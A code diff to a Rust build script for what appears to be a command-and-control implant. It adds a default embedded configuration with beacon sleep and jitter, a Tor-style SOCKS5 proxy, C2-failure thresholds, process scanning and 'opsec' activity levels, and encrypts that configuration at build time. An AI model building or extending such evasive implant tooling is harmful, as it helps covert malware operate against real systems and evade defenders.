@@ -151,11 +151,40 @@ fn main() {
             String::new() // Indicate to fall back to file-based config
         }
     } else {
-        fs::read_to_string("config.json").expect("config.json not found")
+        fs::read_to_string("config.json").unwrap_or_else(|_| {
+
+            // If config.json is not found, use default configuration
+            log_build("config.json not found, using default configuration");
+            r#"{
+                "server_url": "127.0.0.1:8080",
+                "sleep_interval": 60,
+                "jitter": 2,
+                "payload_id": "default-payload-id",
+                "protocol": "http",
+                "socks5_enabled": false,
+                "socks5_host": "127.0.0.1",
+                "socks5_port": 9050,
+                "base_max_consecutive_c2_failures": 5,
+                "min_duration_reduced_activity_secs": 120,
+                "reduced_activity_sleep_secs": 120,
+                "c2_failure_threshold_increase_factor": 1.1,
+                "c2_failure_threshold_decrease_factor": 0.9,
+                "c2_threshold_adjust_interval_secs": 3600,
+                "c2_dynamic_threshold_max_multiplier": 2.0,
+                "proc_scan_interval_secs": 300,
+                "base_score_threshold_bg_to_reduced": 20.0,
+                "base_score_threshold_reduced_to_full": 60.0,
+                "min_duration_full_opsec_secs": 300,
+                "min_duration_background_opsec_secs": 60
+            }"#.to_string()
+        })
     };
 
-    let payload_id = env::var("PAYLOAD_ID").expect("PAYLOAD_ID must be set for encryption");
-
+    let payload_id = env::var("PAYLOAD_ID").unwrap_or_else(|_| {
+        log_build("PAYLOAD_ID not set, using default for development");
+        "default-payload-id".to_string()
+    });
+    
     let (encrypted_data, config_key) = encrypt_config(&config_json, &payload_id);
 
     let out_dir = env::var("OUT_DIR").unwrap();
